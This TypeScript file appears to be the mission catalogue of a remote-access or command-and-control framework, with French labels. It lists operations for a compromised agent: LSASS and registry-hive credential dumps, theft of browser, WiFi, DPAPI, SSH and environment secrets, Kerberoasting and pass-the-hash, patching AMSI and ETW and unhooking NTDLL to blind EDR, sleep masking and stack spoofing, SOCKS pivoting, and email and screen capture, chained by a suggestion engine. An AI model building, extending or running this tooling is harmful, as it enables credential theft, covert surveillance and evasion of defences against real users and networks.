    icon: 'Mail',
    category: 'exfiltration',
    difficulty: 'standard',
    duration: '~30s',
    needsAgent: true,
    tags: ['outlook', 'email', 'mail', 'communications'],
    mitre: ['T1119'],
    steps: [
      { module: 'builtin', action: 'outlook_emails', params: {}, label: 'Extraction emails', insight: 'Emails récents — pièces jointes, communications', timeout: 30 },
    ],
    suggests: ['file-search', 'credential-harvest', 'browser-history'],
  },
]

// ===========================================================================
// POST-EXPLOITATION — Advanced operations after initial foothold
// ===========================================================================

const POSTEXPLOIT_MISSIONS: Mission[] = [
  {
    id: 'shell-access',
    title: 'Shell Interactif',
    description: 'Ouvre un shell distant sur l\'agent pour exécuter des commandes ad-hoc.',
    icon: 'TerminalSquare',
    category: 'post-exploit',
    difficulty: 'quick',
    duration: '~10s',
    needsAgent: true,
    tags: ['shell', 'interactive', 'command', 'remote'],
    mitre: ['T1059'],
    steps: [
      { module: 'shell', action: 'exec', params: { cmd: 'whoami && hostname && cd', timeout: 10 }, label: 'Test shell', insight: 'Shell fonctionnel — ouvre le Terminal pour plus', timeout: 15 },
    ],
    suggests: ['quick-recon', 'file-search'],
  },
  {
    id: 'privesc-check',
    title: 'Check Élévation Privilèges',
    description: 'Vérifie les vecteurs d\'élévation de privilèges: UAC, services faillibles, tokens.',
    icon: 'ArrowUpCircle',
    category: 'post-exploit',
    difficulty: 'standard',
    duration: '~30s',
    needsAgent: true,
    tags: ['privesc', 'elevation', 'privilege', 'admin'],
    mitre: ['T1068', 'T1548'],
    steps: [
      { module: 'shell', action: 'exec', params: { cmd: 'whoami /priv', timeout: 10 }, label: 'Privilèges actuels', insight: 'Privilèges du user — SeDebug? SeImpersonate?', timeout: 15 },
      { module: 'uac_bypass', action: 'check_uac', params: {}, label: 'Niveau UAC', insight: 'UAC configurable? Bypass possible?', timeout: 10 },
      { module: 'shell', action: 'exec', params: { cmd: 'net localgroup administrators', timeout: 10 }, label: 'Admins locaux', insight: 'Qui est admin local?', timeout: 15 },
    ],
    suggests: ['uac-bypass', 'credential-harvest', 'persistence-install'],
  },
  {
    id: 'domain-enum',
    title: 'Énumération Domaine AD',
    description: 'Énumération Active Directory: users, admins, computers, trusts, GPOs.',
    icon: 'Building',
    category: 'post-exploit',
    difficulty: 'advanced',
    duration: '~60s',
    needsAgent: true,
    tags: ['ad', 'domain', 'enumeration', 'active directory', 'enterprise'],
    mitre: ['T1018', 'T1087', 'T1069', 'T1482'],
    steps: [
      { module: 'builtin', action: 'domain_users', params: {}, label: 'Users domaine', insight: 'Tous les users AD', timeout: 20 },
      { module: 'builtin', action: 'domain_admins', params: {}, label: 'Admins domaine', insight: 'DA accounts — cibles critiques', timeout: 15 },
      { module: 'builtin', action: 'domain_computers', params: {}, label: 'Computers domaine', insight: 'Machines du domaine — cibles latérales', timeout: 20 },
      { module: 'builtin', action: 'trust_domains', params: {}, label: 'Trusts', insight: 'Domaines de confiance — expansion possible', timeout: 15 },
      { module: 'builtin', action: 'dns_enum', params: {}, label: 'DNS enum', insight: 'Records DNS — services internes', timeout: 20 },
    ],
    suggests: ['lateral-prep', 'credential-harvest', 'subnet-scan'],
  },
]

// ===========================================================================
// COMPOSITE — Full assessment operations
// ===========================================================================

const COMPOSITE_MISSIONS: Mission[] = [
  {
    id: 'full-assessment',
    title: 'Assessment Complet',
    description: 'Tout en une fois: recon + credentials + persistence + réseau + évasion. L\'opération complète.',
    icon: 'Rocket',
    category: 'recon',
    difficulty: 'advanced',
    duration: '~5min',
    needsAgent: true,
    tags: ['full', 'complete', 'assessment', 'all-in-one', 'operation'],
    mitre: ['T1082', 'T1555', 'T1547', 'T1046', 'T1562'],
    steps: [
      // Phase 1: Recon
      { module: 'info', action: 'run', params: {}, label: '[1/12] Info système', insight: 'OS, hostname, IP, utilisateur', timeout: 15 },
      { module: 'screenshot', action: 'capture', params: { quality: 70 }, label: '[2/12] Capture écran', insight: 'Vue du bureau', timeout: 15 },
      { module: 'builtin', action: 'processes', params: {}, label: '[3/12] Processus', insight: 'AV/EDR détecté?', timeout: 20 },
      // Phase 2: Credentials
      { module: 'browser', action: 'passwords', params: { browsers: ['chrome', 'edge'], limit: 200 }, label: '[4/12] Passwords navigateurs', insight: 'Mots de passe sauvegardés', timeout: 45 },
      { module: 'wifi', action: 'credentials', params: {}, label: '[5/12] Credentials WiFi', insight: 'Clés WPA', timeout: 15 },
      { module: 'builtin', action: 'credential_manager', params: {}, label: '[6/12] Credential Manager', insight: 'Credentials Windows', timeout: 20 },
      // Phase 3: Network
      { module: 'builtin', action: 'netinfo', params: {}, label: '[7/12] Infos réseau', insight: 'Domain, DNS, interfaces', timeout: 15 },
      { module: 'builtin', action: 'netstat', params: {}, label: '[8/12] Connexions', insight: 'Ports en écoute, connexions actives', timeout: 20 },
      // Phase 4: Persistence
      { module: 'persistence', action: 'check', params: {}, label: '[9/12] Check persistance', insight: 'Déjà installé?', timeout: 10 },
      // Phase 5: Files
      { module: 'builtin', action: 'ssh_keys', params: {}, label: '[10/12] Clés SSH', insight: 'Accès serveurs', timeout: 10 },
      { module: 'builtin', action: 'env_secrets', params: {}, label: '[11/12] Secrets env', insight: 'API keys, tokens', timeout: 10 },
      // Phase 6: Final screenshot
      { module: 'screenshot', action: 'capture', params: { quality: 80 }, label: '[12/12] Capture finale', insight: 'Vue finale du bureau', timeout: 15 },
    ],
    suggests: ['persistence-install', 'edr-bypass', 'lateral-prep', 'domain-enum'],
  },
  {
    id: 'silent-recon',
    title: 'Recon Silencieux',
    description: 'Recon discret: évite les commandes bruyantes. Idéal quand l\'EDR est actif.',
    icon: 'Eye',
    category: 'recon',
    difficulty: 'standard',
    duration: '~30s',
    needsAgent: true,
    tags: ['stealth', 'silent', 'quiet', 'opsec', 'recon'],
    mitre: ['T1082', 'T1016'],
    steps: [
      { module: 'info', action: 'run', params: {}, label: 'Info système (API)', insight: 'OS, hostname, IP — via API, pas de shell', timeout: 15 },
      { module: 'builtin', action: 'netinfo', params: {}, label: 'Infos réseau (API)', insight: 'Réseau via API — pas de commande bruyante', timeout: 15 },
      { module: 'screenshot', action: 'capture', params: { quality: 50 }, label: 'Capture discrète', insight: 'Screenshot qualité réduite — plus rapide', timeout: 15 },
    ],
    suggests: ['edr-check', 'credential-harvest', 'stealth-mode'],
  },
]

// ===========================================================================
// OFFENSIVE — Active offensive operations (tested on FBOX)
// ===========================================================================

const OFFENSIVE_MISSIONS: Mission[] = [
  {
    id: 'lsass-dump',
    title: 'LSASS Memory Dump',
    description: 'Dump de la mémoire LSASS pour extraire les credentials NTLM/Kerberos. Requiert admin/SeDebugPrivilege.',
    icon: 'Database',
    category: 'credentials',
    difficulty: 'advanced',
    duration: '~45s',
    needsAgent: true,
    tags: ['lsass', 'credentials', 'ntlm', 'kerberos', 'memory', 'mimikatz-like'],
    mitre: ['T1003.001'],
    requiresApproval: true,
    steps: [
      { module: 'credential_dump', action: 'lsass', params: {}, label: 'LSASS MiniDump', insight: 'Dump mémoire LSASS via comsvcs.dll — base64 du dump', timeout: 45 },
    ],
    suggests: ['credential-harvest', 'pth-attack', 'kerberoast-attack'],
  },
  {
    id: 'registry-hive-dump',
    title: 'SAM/SYSTEM/SECURITY Hive Dump',
    description: 'Sauvegarde les hives du registre Windows (SAM, SYSTEM, SECURITY) pour extraction offline des hashes NTLM.',
    icon: 'Database',
    category: 'credentials',
    difficulty: 'advanced',
    duration: '~30s',
    needsAgent: true,
    tags: ['registry', 'sam', 'system', 'ntlm', 'hashes', 'offline'],
    mitre: ['T1003.002'],
    requiresApproval: true,
    steps: [
      { module: 'credential_dump', action: 'registry', params: {}, label: 'reg save SAM/SYSTEM/SECURITY', insight: 'Hives sauvegardés en base64 — pour cracking offline avec impacket/secretsdump', timeout: 30 },
    ],
    suggests: ['lsass-dump', 'credential-harvest', 'dpapi-dump'],
  },
  {
    id: 'dpapi-dump',
    title: 'DPAPI Master Keys Extraction',
    description: 'Extrait toutes les master keys DPAPI du profil utilisateur. Permet de déchiffrer les credentials Chrome, Edge, etc.',
    icon: 'KeyRound',
    category: 'credentials',
    difficulty: 'advanced',
    duration: '~15s',
    needsAgent: true,
    tags: ['dpapi', 'master-keys', 'chrome', 'edge', 'decrypt', 'browser'],
    mitre: ['T1555.004'],
    steps: [
      { module: 'credential_dump', action: 'dpapi', params: {}, label: 'DPAPI master keys', insight: 'Master keys en base64 — combine avec le mot de passe user pour déchiffrer', timeout: 15 },
    ],
    suggests: ['credential-harvest', 'lsass-dump', 'registry-hive-dump'],
  },
  {
    id: 'kerberos-tickets',
    title: 'Kerberos Tickets Cache',
    description: 'Liste tous les tickets Kerberos mis en cache. Préparation pour pass-the-ticket ou Kerberoasting.',
    icon: 'Ticket',
    category: 'credentials',
    difficulty: 'standard',
    duration: '~15s',
    needsAgent: true,
    tags: ['kerberos', 'tickets', 'pass-the-ticket', 'pth', 'ad'],
    mitre: ['T1558.003'],
    steps: [
      { module: 'credential_dump', action: 'kerberos', params: {}, label: 'klist tickets', insight: 'Tickets Kerberos en cache — utilisables pour PTT', timeout: 15 },
    ],
    suggests: ['pth-attack', 'kerberoast-attack', 'lsass-dump'],
  },
  {
    id: 'pth-attack',
    title: 'Pass-the-Hash Toolkit',
    description: 'Dump des tickets et hashes pour préparation pass-the-hash. Énumère les credentials exploitables pour mouvement latéral.',
    icon: 'KeyRound',
    category: 'credentials',
    difficulty: 'advanced',
    duration: '~20s',
    needsAgent: true,
    tags: ['pth', 'pass-the-hash', 'ntlm', 'lateral', 'tickets'],
    mitre: ['T1550.002', 'T1558'],
    requiresApproval: true,
    steps: [
      { module: 'pth', action: 'dump_tickets', params: {}, label: 'Dump tickets PTH', insight: 'Tickets et hashes pour pass-the-hash', timeout: 20 },
      { module: 'credential_dump', action: 'kerberos', params: {}, label: 'Kerberos cache', insight: 'Tickets Kerberos additionnels', timeout: 15 },
    ],
    suggests: ['lateral-movement', 'lsass-dump', 'kerberoast-attack'],
  },
  {
    id: 'kerberoast-attack',
    title: 'Kerberoasting',
    description: 'Tente de récupérer les TGS des comptes service avec SPN pour cracking offline. Attaque Kerberoast classique.',
    icon: 'Flame',
    category: 'credentials',
    difficulty: 'advanced',
    duration: '~30s',
    needsAgent: true,
    tags: ['kerberoast', 'kerberos', 'tgs', 'spn', 'crack', 'ad'],
    mitre: ['T1558.003'],
    requiresApproval: true,
    steps: [
      { module: 'kerberoast', action: 'kerberoast', params: { domain: 'local' }, label: 'Kerberoast scan', insight: 'TGS des comptes service — à cracker offline avec hashcat', timeout: 30 },
    ],
    suggests: ['pth-attack', 'lsass-dump', 'lateral-movement'],
  },
  {
    id: 'token-impersonation',
    title: 'Token Impersonation & Privileges',
    description: 'Énumère le token courant, les privilèges, et le SID. Préparation pour impersonation et élévation de privilèges.',
    icon: 'UserCog',
    category: 'post-exploit',
    difficulty: 'advanced',
    duration: '~20s',
    needsAgent: true,
    tags: ['token', 'impersonation', 'privesc', 'privileges', 'sid'],
    mitre: ['T1134.001', 'T1134.002'],
    steps: [
      { module: 'token', action: 'get_uid', params: {}, label: 'Identité token', insight: 'Username et SID courant', timeout: 10 },
      { module: 'token', action: 'get_privileges', params: {}, label: 'Privilèges effectifs', insight: 'SeDebug? SeImpersonate? SeAssignPrimaryToken? — vecteurs d\'élévation', timeout: 10 },
    ],
    suggests: ['uac-bypass', 'lsass-dump', 'lateral-movement'],
  },
  {
    id: 'process-injection-recon',
    title: 'Process Injection Recon',
    description: 'Liste tous les processus avec PID, architecture et session. Identifie les cibles pour injection/migration.',
    icon: 'Syringe',
    category: 'post-exploit',
    difficulty: 'advanced',
    duration: '~15s',
    needsAgent: true,
    tags: ['injection', 'process', 'migration', 'dll', 'shellcode', 'hollowing'],
    mitre: ['T1055'],
    steps: [
      { module: 'injection', action: 'list_processes', params: {}, label: 'Liste processus (injection API)', insight: 'PID, arch, session — cibles pour DLL inject ou process hollowing', timeout: 15 },
    ],
    suggests: ['token-impersonation', 'edr-bypass', 'stealth-mode'],
  },
  {
    id: 'lateral-recon',
    title: 'Lateral Movement Recon',
    description: 'Énumère shares, sessions et cibles pour mouvement latéral. Identifie les hosts accessibles et les credentials réutilisables.',
    icon: 'GitBranch',
    category: 'lateral',
    difficulty: 'advanced',
    duration: '~30s',
    needsAgent: true,
    tags: ['lateral', 'shares', 'sessions', 'psexec', 'wmi', 'winrm', 'dcom'],
    mitre: ['T1021', 'T1077', 'T1057'],
    steps: [
      { module: 'lateral', action: 'enumerate_shares', params: { host: '127.0.0.1' }, label: 'Shares locaux', insight: 'C$, IPC$, ADMIN$ — vecteurs de copie latérale', timeout: 20 },
      { module: 'lateral', action: 'enumerate_sessions', params: { host: '127.0.0.1' }, label: 'Sessions actives', insight: 'Sessions réseau — cibles pour hijack', timeout: 15 },
      { module: 'builtin', action: 'shares', params: {}, label: 'Shares Windows', insight: 'Shares détaillés via API Windows', timeout: 15 },
    ],
    suggests: ['pth-attack', 'lateral-movement', 'credential-harvest'],
  },
  {
    id: 'edr-bypass-full',
    title: 'EDR Bypass — Full',
    description: 'Patch AMSI, ETW, et unhook NTDLL. Aveugle les détections EDR pour opérer librement. Opération à haut risque.',
    icon: 'ShieldAlert',
    category: 'evasion',
    difficulty: 'expert',
    duration: '~30s',
    needsAgent: true,
    tags: ['edr', 'amsi', 'etw', 'ntdll', 'unhook', 'bypass', 'stealth'],
    mitre: ['T1562.001', 'T1562.002'],
    requiresApproval: true,
    steps: [
      { module: 'edr_evasion', action: 'status', params: {}, label: 'Status EDR avant', insight: 'AMSI/ETW/NTDLL — état avant bypass', timeout: 10 },
      { module: 'edr_evasion', action: 'patch_amsi', params: {}, label: 'Patch AMSI', insight: 'AMSI patché — scripts PS non détectés', timeout: 10 },
      { module: 'edr_evasion', action: 'patch_etw', params: {}, label: 'Patch ETW', insight: 'ETW patché — events de télémétrie supprimés', timeout: 10 },
      { module: 'edr_evasion', action: 'unhook_ntdll', params: {}, label: 'Unhook NTDLL', insight: 'NTDLL restauré — hooks EDR supprimés', timeout: 15 },
      { module: 'edr_evasion', action: 'status', params: {}, label: 'Status EDR après', insight: 'Confirmation que tout est patché', timeout: 10 },
    ],
    suggests: ['stealth-mode', 'process-injection-recon', 'credential-harvest'],
  },
  {
    id: 'sleep-mask-activate',
    title: 'Sleep Mask Activation',
    description: 'Active le sleep mask pour chiffrer la mémoire de l\'agent en mémoire pendant les périodes de sleep. Évite la détection par scanner mémoire.',
    icon: 'EyeOff',
    category: 'evasion',
    difficulty: 'expert',
    duration: '~15s',
    needsAgent: true,
    tags: ['sleep-mask', 'memory', 'encrypt', 'stealth', 'ekko'],
    mitre: ['T1027', 'T1497.001'],
    requiresApproval: true,
    steps: [
      { module: 'sleep_mask', action: 'status', params: {}, label: 'Status sleep mask', insight: 'Sleep mask actif?', timeout: 10 },
      { module: 'sleep_mask', action: 'enable', params: {}, label: 'Activation sleep mask', insight: 'Mémoire chiffrée pendant le sleep — détection scanner évitée', timeout: 10 },
      { module: 'sleep_mask', action: 'status', params: {}, label: 'Vérification', insight: 'Sleep mask maintenant actif', timeout: 10 },
    ],
    suggests: ['edr-bypass-full', 'stealth-mode', 'process-injection-recon'],
  },
  {
    id: 'stack-spoof-activate',
    title: 'Stack Spoofing',
    description: 'Active le stack spoofing pour cacher la véritable pile d\'exécution. Évite la détection par stack walking EDR.',
    icon: 'Layers',
    category: 'evasion',
    difficulty: 'expert',
    duration: '~15s',
    needsAgent: true,
    tags: ['stack', 'spoof', 'threads', 'edr', 'detection'],
    mitre: ['T1027'],
    requiresApproval: true,
    steps: [
      { module: 'stack_spoof', action: 'status', params: {}, label: 'Status stack spoof', insight: 'Stack spoofing actif?', timeout: 10 },
      { module: 'stack_spoof', action: 'spoof', params: {}, label: 'Activation spoof', insight: 'Stack spoofé — call stack masquée', timeout: 10 },
    ],
    suggests: ['sleep-mask-activate', 'edr-bypass-full', 'stealth-mode'],
  },
  {
    id: 'syscalls-direct',
    title: 'Direct Syscalls Mode',
    description: 'Active les syscalls directs pour bypasser les hooks userland de l\'EDR. Appels système sans passer par ntdll.',
    icon: 'Terminal',
    category: 'evasion',
    difficulty: 'expert',
    duration: '~15s',
    needsAgent: true,
    tags: ['syscalls', 'direct', 'ntdll', 'bypass', 'userland'],
    mitre: ['T1106', 'T1562'],
    requiresApproval: true,
    steps: [
      { module: 'syscalls', action: 'list', params: {}, label: 'Syscalls disponibles', insight: 'Syscalls résolus — prêts pour appel direct', timeout: 10 },
      { module: 'syscalls', action: 'check', params: {}, label: 'Vérification syscalls', insight: 'Intégrité des syscalls — pas de hooks', timeout: 10 },
    ],
    suggests: ['edr-bypass-full', 'stack-spoof-activate', 'process-injection-recon'],
  },
  {
    id: 'pivoting-setup',
    title: 'Pivoting Setup',
    description: 'Configure un pivot SOCKS sur l\'agent pour accéder au réseau interne. Tunnelise le trafic à travers l\'agent compromis.',
    icon: 'Network',
    category: 'network',
    difficulty: 'expert',
    duration: '~20s',
    needsAgent: true,
    tags: ['pivoting', 'socks', 'proxy', 'tunnel', 'internal', 'lateral'],
    mitre: ['T1090', 'T1021'],
    requiresApproval: true,
    steps: [
      { module: 'pivoting', action: 'status', params: {}, label: 'Status pivot', insight: 'Pivot actif? Port?', timeout: 10 },
      { module: 'pivoting', action: 'start', params: { port: 1080 }, label: 'Démarrage pivot SOCKS', insight: 'SOCKS proxy sur port 1080 — route le trafic via l\'agent', timeout: 15 },
    ],
    suggests: ['lateral-recon', 'subnet-scan', 'port-scan'],
  },
  {
    id: 'full-offensive-assessment',
    title: 'Full Offensive Assessment',
    description: 'Assessment offensif complet: credential dump + token + EDR status + lateral recon + injection recon. Tout ce qu\'il faut pour planifier la suite.',
    icon: 'Rocket',
    category: 'post-exploit',
    difficulty: 'expert',
    duration: '~120s',
    needsAgent: true,
    tags: ['full', 'assessment', 'offensive', 'credentials', 'edr', 'lateral', 'injection'],
    mitre: ['T1003', 'T1558', 'T1055', 'T1562', 'T1021'],
    requiresApproval: true,
    steps: [
      { module: 'credential_dump', action: 'dpapi', params: {}, label: 'DPAPI master keys', insight: 'Master keys pour déchiffrer les credentials browser', timeout: 15 },
      { module: 'credential_dump', action: 'kerberos', params: {}, label: 'Kerberos tickets', insight: 'Tickets cache — PTT possible', timeout: 15 },
      { module: 'token', action: 'get_uid', params: {}, label: 'Token identity', insight: 'Username et SID', timeout: 10 },
      { module: 'token', action: 'get_privileges', params: {}, label: 'Privilèges', insight: 'SeDebug? SeImpersonate? — vecteurs privesc', timeout: 10 },
      { module: 'edr_evasion', action: 'status', params: {}, label: 'EDR status', insight: 'AMSI/ETW/NTDLL — détections actives?', timeout: 10 },
      { module: 'injection', action: 'list_processes', params: {}, label: 'Process injection recon', insight: 'Cibles pour migration/injection', timeout: 15 },
      { module: 'lateral', action: 'enumerate_shares', params: { host: '127.0.0.1' }, label: 'Lateral shares', insight: 'Shares pour mouvement latéral', timeout: 20 },
      { module: 'persistence_adv', action: 'list_persistence', params: {}, label: 'Persistence existante', insight: 'Mécanismes déjà installés', timeout: 15 },
      { module: 'stealth', action: 'indicators', params: {}, label: 'Stealth indicators', insight: 'User actif? Screen verrouillé?', timeout: 10 },
    ],
    suggests: ['edr-bypass-full', 'lsass-dump', 'lateral-movement', 'pivoting-setup'],
  },
]

// ===========================================================================
// Export
// ===========================================================================

export const MISSIONS: Mission[] = [
  ...RECON_MISSIONS,
  ...SURVEILLANCE_MISSIONS,
  ...CREDENTIAL_MISSIONS,
  ...PERSISTENCE_MISSIONS,
  ...NETWORK_MISSIONS,
  ...EVASION_MISSIONS,
  ...EXFIL_MISSIONS,
  ...POSTEXPLOIT_MISSIONS,
  ...COMPOSITE_MISSIONS,
  ...OFFENSIVE_MISSIONS,
]

export const MISSION_MAP: Record<string, Mission> = Object.fromEntries(
  MISSIONS.map((m) => [m.id, m])
)

export const CATEGORIES = [
  { id: 'recon' as const, label: 'Recon', icon: 'Radar', color: 'text-info', desc: 'Découverte & énumération' },
  { id: 'surveillance' as const, label: 'Surveillance', icon: 'Eye', color: 'text-warning', desc: 'Écran, webcam, keylog' },
  { id: 'credentials' as const, label: 'Credentials', icon: 'KeyRound', color: 'text-error', desc: 'Passwords & tokens' },
  { id: 'persistence' as const, label: 'Persistence', icon: 'Anchor', color: 'text-success', desc: 'Maintien d\'accès' },
  { id: 'network' as const, label: 'Réseau', icon: 'Network', color: 'text-info', desc: 'Scan & mapping' },
  { id: 'lateral' as const, label: 'Latéral', icon: 'GitBranch', color: 'text-info', desc: 'Mouvement latéral' },
  { id: 'evasion' as const, label: 'Évasion', icon: 'ShieldAlert', color: 'text-base-content', desc: 'Bypass & OPSEC' },
  { id: 'exfiltration' as const, label: 'Exfiltration', icon: 'Download', color: 'text-warning', desc: 'Données & fichiers' },
  { id: 'post-exploit' as const, label: 'Post-Exploit', icon: 'Rocket', color: 'text-error', desc: 'Opérations avancées' },
]

/** Get missions by category */
export function missionsByCategory(cat: MissionCategory): Mission[] {
  return MISSIONS.filter((m) => m.category === cat)
}

/** Get suggested missions (not yet run) */
export function suggestedMissions(runIds: Set<string>, currentId?: string): Mission[] {
  if (!currentId) {
    // Default suggestions for new users
    return ['quick-recon', 'credential-harvest', 'wifi-audit', 'screenshot', 'edr-check']
      .map((id) => MISSION_MAP[id])
      .filter(Boolean)
  }
  const mission = MISSION_MAP[currentId]
  if (!mission?.suggests) return []
  return mission.suggests
    .map((id) => MISSION_MAP[id])
    .filter((m) => m && !runIds.has(m.id))
}
